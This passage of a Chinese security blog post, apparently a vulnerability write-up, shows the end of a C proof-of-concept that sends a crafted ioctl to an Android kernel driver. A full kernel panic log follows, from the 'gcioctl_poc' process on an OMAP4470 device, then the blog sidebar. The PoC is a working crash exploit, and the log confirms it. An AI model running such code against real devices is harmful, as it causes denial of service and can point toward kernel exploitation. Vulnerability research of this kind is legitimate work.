class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line">[  164.793151] Unable to handle kernel NULL pointer dereference at virtual address 00000037</span><br><span class="line">[  164.802459] pgd &#x3D; c26ec000</span><br><span class="line">[  164.805664] [00000037] *pgd&#x3D;82f42831, *pte&#x3D;00000000, *ppte&#x3D;00000000</span><br><span class="line">[  164.813415] Internal error: Oops: 17 [#1] PREEMPT SMP ARM</span><br><span class="line">[  164.819458] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[  164.827239] CPU: 1    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[  164.834686] PC is at dev_ioctl+0x4ac&#x2F;0x10c4</span><br><span class="line">[  164.839416] LR is at down_timeout+0x40&#x2F;0x5c</span><br><span class="line">[  164.844146] pc : [&lt;c03178e8&gt;]    lr : [&lt;c006e9b8&gt;]    psr: 60000013</span><br><span class="line">[  164.844146] sp : c25a1e70  ip : c25a1e50  fp : c25a1f04</span><br><span class="line">[  164.857116] r10: 00000000  r9 : d8c0aca8  r8 : bed5c610</span><br><span class="line">[  164.863128] r7 : c0a25b50  r6 : c25a0000  r5 : bed5c610  r4 : 0000000f</span><br><span class="line">[  164.870391] r3 : 00001403  r2 : 00000000  r1 : 20000013  r0 : 00000000</span><br><span class="line">[  164.877807] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  164.885894] Control: 10c5387d  Table: 826ec04a  DAC: 00000015</span><br><span class="line">[  164.892303] </span><br><span class="line">[  164.892333] PC: 0xc0317868:</span><br><span class="line">[  164.897308] 7868  30d22003 33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f</span><br><span class="line">[  164.907989] 7888  e3c6603f e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064</span><br><span class="line">[  164.918670] 78a8  e1a01005 e3a02008 e50b3088 e1a00003 ebfcfa5f e3500000 1a00001e e51b4060</span><br><span class="line">[  164.929351] 78c8  e3020710 e59f7bdc ebf4db32 e1a01000 e2870038 ebf55c25 e3500000 1a0002e0</span><br><span class="line">[  164.939880] 78e8  e5943028 e1a08000 e5940024 e1a02007 e2841024 e5803004 e5830000 e5b23070</span><br><span class="line">[  164.950561] 7908  e5871070 e2420038 e5831004 e5843024 e5842028 ebf55bb9 e50b8060 e50b8064</span><br><span class="line">[  164.961212] 7928  ea000006 e24b1064 e50b1088 e51b0088 e3a01008 ebfd0387 e3a03004 e50b3064</span><br><span class="line">[  164.971771] 7948  e5963008 e2952008 30d22003 33a03000 e3530000 1affffc5 e1a00005 e51b1088</span><br><span class="line">[  164.982299] </span><br><span class="line">[  164.982330] LR: 0xc006e938:</span><br><span class="line">[  164.987426] e938  e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005</span><br><span class="line">[  164.997955] e958  e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4</span><br><span class="line">[  165.008636] e978  e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000</span><br><span class="line">[  165.019317] e998  e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794</span><br><span class="line">[  165.029846] e9b8  e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d</span><br><span class="line">[  165.040374] e9d8  e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008</span><br><span class="line">[  165.051055] e9f8  e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004</span><br><span class="line">[  165.061737] ea18  e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d</span><br><span class="line">[  165.072265] </span><br><span class="line">[  165.072265] SP: 0xc25a1df0:</span><br><span class="line">[  165.077362] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff</span><br><span class="line">[  165.087890] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013</span><br><span class="line">[  165.098419] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8</span><br><span class="line">[  165.109100] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff</span><br><span class="line">[  165.119781] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920</span><br><span class="line">[  165.130340] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff</span><br><span class="line">[  165.141021] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580</span><br><span class="line">[  165.151702] 1ed0  c25a1efc c25a1ee0 c02089fc 00000000 c719ab40 00000004 c719ab40 bed5c610</span><br><span class="line">[  165.162353] </span><br><span class="line">[  165.162384] IP: 0xc25a1dd0:</span><br><span class="line">[  165.167327] 1dd0  c0070df8 c00795ac c25a0000 00000001 00000004 d454d0f4 60000013 00000001</span><br><span class="line">[  165.178009] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff</span><br><span class="line">[  165.188537] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013</span><br><span class="line">[  165.199249] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8</span><br><span class="line">[  165.209899] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff</span><br><span class="line">[  165.220581] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920</span><br><span class="line">[  165.231109] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff</span><br><span class="line">[  165.241790] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580</span><br><span class="line">[  165.252441] </span><br><span class="line">[  165.252441] FP: 0xc25a1e84:</span><br><span class="line">[  165.257415] 1e84  c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff</span><br><span class="line">[  165.268066] 1ea4  0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14 00000000</span><br><span class="line">[  165.278717] 1ec4  00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000 c719ab40</span><br><span class="line">[  165.289276] 1ee4  00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08 c0136044</span><br><span class="line">[  165.299926] 1f04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440</span><br><span class="line">[  165.310607] 1f24  c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004 c25a0000</span><br><span class="line">[  165.321136] 1f44  00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004 c25a0000</span><br><span class="line">[  165.331695] 1f64  00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000 00000400</span><br><span class="line">[  165.342346] </span><br><span class="line">[  165.342376] R6: 0xc259ff80:</span><br><span class="line">[  165.347320] ff80  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.358001] ffa0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.368682] ffc0  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.379241] ffe0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.389770] 0000  00000000 00000002 00000000 d72b0980 c0a0e840 00000001 00000015 c265dc00</span><br><span class="line">[  165.400451] 0020  00000000 c25a0000 c09ddc50 d72b0980 de949300 c1620b40 c25a1b7c c25a1ac8</span><br><span class="line">[  165.411132] 0040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[  165.421661] 0060  005634c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.432342] </span><br><span class="line">[  165.432342] R7: 0xc0a25ad0:</span><br><span class="line">[  165.437316] 5ad0  00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03</span><br><span class="line">[  165.447875] 5af0  01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005</span><br><span class="line">[  165.458526] 5b10  01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001</span><br><span class="line">[  165.469207] 5b30  ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001</span><br><span class="line">[  165.479736] 5b50  00000000 00000000 00000001 c0a25b5c c0a25b5c c0a25b64 c0a25b64 00000000</span><br><span class="line">[  165.490417] 5b70  00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000</span><br><span class="line">[  165.500946] 5b90  00000000 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001</span><br><span class="line">[  165.511627] 5bb0  c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8</span><br><span class="line">[  165.522186] </span><br><span class="line">[  165.522186] R9: 0xd8c0ac28:</span><br><span class="line">[  165.527282] ac28  d8c0ac28 d8c0ac28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[  165.537841] ac48  00000000 00000000 d8c0ac50 d8c0ac50 00000000 c0aa5174 c0aa5174 c0aa5148</span><br><span class="line">[  165.548492] ac68  5aefbbda 00000000 00000000 00000000 d8c0ac80 00000000 00000000 00000000</span><br><span class="line">[  165.559020] ac88  00200000 00000000 00000000 d8c0ac94 d8c0ac94 dd3f6080 dd3f6080 00000000</span><br><span class="line">[  165.569702] aca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400</span><br><span class="line">[  165.580261] acc8  d8c0ad80 dd3ede70 00001064 00000001 0fb00000 5aefbbda 2e19b832 5aefbbda</span><br><span class="line">[  165.590911] ace8  2e19b832 5aefbbda 2e19b832 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.601593] ad08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0ad24</span><br><span class="line">[  165.612121] Process gcioctl_poc (pid: 3932, stack limit &#x3D; 0xc25a02f8)</span><br><span class="line">[  165.619445] Stack: (0xc25a1e70 to 0xc25a2000)</span><br><span class="line">[  165.624359] 1e60:                                     00000001 00000028 000fffff c25a1ea0</span><br><span class="line">[  165.633605] 1e80: c25a1edc c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8</span><br><span class="line">[  165.642822] 1ea0: ffffffff 0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14</span><br><span class="line">[  165.652038] 1ec0: 00000000 00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000</span><br><span class="line">[  165.661102] 1ee0: c719ab40 00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08</span><br><span class="line">[  165.670318] 1f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><br><span class="line">[  165.679565] 1f20: dcf8c440 c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004</span><br><span class="line">[  165.688781] 1f40: c25a0000 00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004</span><br><span class="line">[  165.697875] 1f60: c25a0000 00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[  165.707092] 1f80: 00000400 bed5c638 00010e64 00000000 00000036 c0013e08 00000000 c25a1fa8</span><br><span class="line">[  165.716308] 1fa0: c0013c60 c0136578 bed5c638 00010e64 00000004 c0085d9e bed5c610 bed5c610</span><br><span class="line">[  165.725402] 1fc0: bed5c638 00010e64 00000000 00000036 00000000 00000000 00000000 bed5c624</span><br><span class="line">[  165.734619] 1fe0: 00000000 bed5c5f4 000106a4 0002918c 60000010 00000004 00000000 00000000</span><br><span class="line">[  165.743835] Backtrace: </span><br><span class="line">[  165.746856] [&lt;c031743c&gt;] (dev_ioctl+0x0&#x2F;0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[  165.756256] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[  165.765502] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  165.774780]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:bed5c638</span><br><span class="line">[  165.783203] Code: e2870038 ebf55c25 e3500000 1a0002e0 (e5943028) </span><br><span class="line">[  165.793060] Board Information: </span><br><span class="line">[  165.793060]  Revision : 0001</span><br><span class="line">[  165.793060]  Serial	: 0000000000000000</span><br><span class="line">[  165.793090] SoC Information:</span><br><span class="line">[  165.793090]  CPU	: OMAP4470</span><br><span class="line">[  165.793090]  Rev	: ES1.0</span><br><span class="line">[  165.793121]  Type	: HS</span><br><span class="line">[  165.793121]  Production ID: 0002B975-000000CC</span><br><span class="line">[  165.793121]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[  165.793121] </span><br><span class="line">[  165.844757] ---[ end trace aba846a2af6e75b7 ]---</span><br><span class="line">[  165.850097] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  165.856109] CPU0: stopping</span><br><span class="line">[  165.859252] Backtrace: </span><br><span class="line">[  165.862274] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[  165.871643]  r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950</span><br><span class="line">[  165.878784] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[  165.887908] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[  165.897399] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40&#x2F;0x70)</span><br><span class="line">[  165.906707] Exception stack(0xd8dcfc38 to 0xd8dcfc80)</span><br><span class="line">[  165.912384] fc20:                                                       c153a9f8 00000000</span><br><span class="line">[  165.921600] fc40: 00000002 c153aa08 00000007 c153a9f8 d8d72210 b6eaf010 d8caee34 bab7375f</span><br><span class="line">[  165.930816] fc60: 00000001 d8dcfcac 0009eded d8dcfc80 c010a5b4 c010a5fc 20070013 ffffffff</span><br><span class="line">[  165.940032]  r6:ffffffff r5:20070013 r4:c010a5fc r3:c010a5b4</span><br><span class="line">[  165.947052] [&lt;c010a534&gt;] (follow_page+0x0&#x2F;0x238) from [&lt;c010af94&gt;] (__get_user_pages+0x13c&#x2F;0x3f0)</span><br><span class="line">[  165.957031] [&lt;c010ae58&gt;] (__get_user_pages+0x0&#x2F;0x3f0) from [&lt;c010b350&gt;] (get_user_pages+0x50&#x2F;0x58)</span><br><span class="line">[  165.967102] [&lt;c010b300&gt;] (get_user_pages+0x0&#x2F;0x58) from [&lt;c00ff544&gt;] (get_user_pages_fast+0x64&#x2F;0x7c)</span><br><span class="line">[  165.977233]  r4:d8caee3c</span><br><span class="line">[  165.980468] [&lt;c00ff4e0&gt;] (get_user_pages_fast+0x0&#x2F;0x7c) from [&lt;c01eeff0&gt;] (fuse_copy_fill+0x1bc&#x2F;0x238)</span><br><span class="line">[  165.990905] [&lt;c01eee34&gt;] (fuse_copy_fill+0x0&#x2F;0x238) from [&lt;c01ef0a4&gt;] (fuse_copy_one+0x38&#x2F;0x68)</span><br><span class="line">[  166.000579]  r6:d8dcdb00 r5:d8dce000 r4:d8dcfe24 r3:00000000</span><br><span class="line">[  166.007690] [&lt;c01ef06c&gt;] (fuse_copy_one+0x0&#x2F;0x68) from [&lt;c01efe64&gt;] (fuse_dev_do_read+0x3e4&#x2F;0x69c)</span><br><span class="line">[  166.017761]  r4:dd243c00</span><br><span class="line">[  166.020874] [&lt;c01efa80&gt;] (fuse_dev_do_read+0x0&#x2F;0x69c) from [&lt;c01f03c0&gt;] (fuse_dev_read+0x84&#x2F;0x9c)</span><br><span class="line">[  166.030853] [&lt;c01f033c&gt;] (fuse_dev_read+0x0&#x2F;0x9c) from [&lt;c0124ecc&gt;] (do_sync_read+0xb0&#x2F;0xf0)</span><br><span class="line">[  166.040222]  r7:00000000 r6:00000000 r5:00000000 r4:00000000</span><br><span class="line">[  166.047363] [&lt;c0124e1c&gt;] (do_sync_read+0x0&#x2F;0xf0) from [&lt;c01258f4&gt;] (vfs_read+0xa4&#x2F;0x148)</span><br><span class="line">[  166.056488] [&lt;c0125850&gt;] (vfs_read+0x0&#x2F;0x148) from [&lt;c01259d8&gt;] (sys_read+0x40&#x2F;0x78)</span><br><span class="line">[  166.065093]  r8:00040050 r7:b6eaf010 r6:d8e08900 r5:00000000 r4:00000000</span><br><span class="line">[  166.073547] [&lt;c0125998&gt;] (sys_read+0x0&#x2F;0x78) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  166.082855]  r8:c0013e08 r7:00000003 r6:b6eaf008 r5:b73828a0 r4:b6eaf010</span><br><span class="line">[  166.091217] CPU0 PC (0) : 0xc0019b2c</span><br><span class="line">[  166.095397] CPU0 PC (1) : 0xc0019b2c</span><br><span class="line">[  166.099456] CPU0 PC (2) : 0xc0019b2c</span><br><span class="line">[  166.103515] CPU0 PC (3) : 0xc0019b2c</span><br><span class="line">[  166.107574] CPU0 PC (4) : 0xc0019b2c</span><br><span class="line">[  166.111785] CPU0 PC (5) : 0xc0019b2c</span><br><span class="line">[  166.115814] CPU0 PC (6) : 0xc0019b2c</span><br><span class="line">[  166.119873] CPU0 PC (7) : 0xc0019b2c</span><br><span class="line">[  166.124084] CPU0 PC (8) : 0xc0019b2c</span><br><span class="line">[  166.128112] CPU0 PC (9) : 0xc0019b2c</span><br><span class="line">[  166.132171] CPU1 PC (0) : 0xc003ee38</span><br><span class="line">[  166.136352] CPU1 PC (1) : 0xc003ee54</span><br><span class="line">[  166.140411] CPU1 PC (2) : 0xc003ee54</span><br><span class="line">[  166.144470] CPU1 PC (3) : 0xc003ee54</span><br><span class="line">[  166.148681] CPU1 PC (4) : 0xc003ee54</span><br><span class="line">[  166.152709] CPU1 PC (5) : 0xc003ee54</span><br><span class="line">[  166.156768] CPU1 PC (6) : 0xc003ee54</span><br><span class="line">[  166.160980] CPU1 PC (7) : 0xc003ee54</span><br><span class="line">[  166.165008] CPU1 PC (8) : 0xc003ee54</span><br><span class="line">[  166.169067] CPU1 PC (9) : 0xc003ee54</span><br><span class="line">[  166.173126] </span><br><span class="line">[  166.175048] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[  166.175079] </span><br></pre></td></tr></table></figure></blockquote>
</div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="ol4three"></figure><p class="title is-size-4 is-block line-height-inherit">ol4three</p><p class="is-size-6 is-block">醒来时世界都远了，我需要最狂的风，和最静的海。</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Chendu,China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">66</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">12</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">69</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ol4three" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ol4three"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile is-mobile" href="http://b0urne.top" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">B0urne</span></span><span class="level-right"><span class="level-item tag">b0urne.top</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://xcniao.ol4three.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Xcniao</span></span><span class="level-right"><span class="level-item tag">xcniao.ol4three.com</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://tengxiaofei.run" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Tengxiaofei</span></span><span class="level-right"><span class="level-item tag">tengxiaofei.run</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://lalalaxiaoyuren.github.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">smail_fish</span></span><span class="level-right"><span class="level-item tag">lalalaxiaoyuren.github.io</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://vinadiak.github.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">vinadiak</span></span><span class="level-right"><span class="level-item tag">vinadiak.github.io</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://www.oldthree.site/micro8/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Micro8</span></span><span class="level-right"><span class="level-item tag">www.oldthree.site</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://www.oldthree.site/pycharm/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Jetbrains</span></span><span class="level-right"><span class="level-item tag">www.oldthree.site</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://118.25.15.216:8080/login" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Java-sec-code</span></span><span class="level-right"><span class="level-item tag">118.25.15.216</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://www.oldthree.site/hacktool/index.html" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">hacktool</span></span><span class="level-right"><span class="level-item tag">www.oldthree.site</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://www.oldthree.site/wooyun/wooyun_articles-gh-pages/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">wooyun_drop_page</span></span><span class="level-right"><span class="level-item tag">www.oldthree.site</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/Android/"><span class="level-start"><span class="level-item">Android</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Android%E6%B5%8B%E8%AF%95/"><span class="level-start"><span class="level-item">Android测试</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/IOT/"><span class="level-start"><span class="level-item">IOT</span></span><span class="level-end"><span class="level-item tag">22</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/WEB/"><span class="level-start"><span class="level-item">WEB</span></span><span 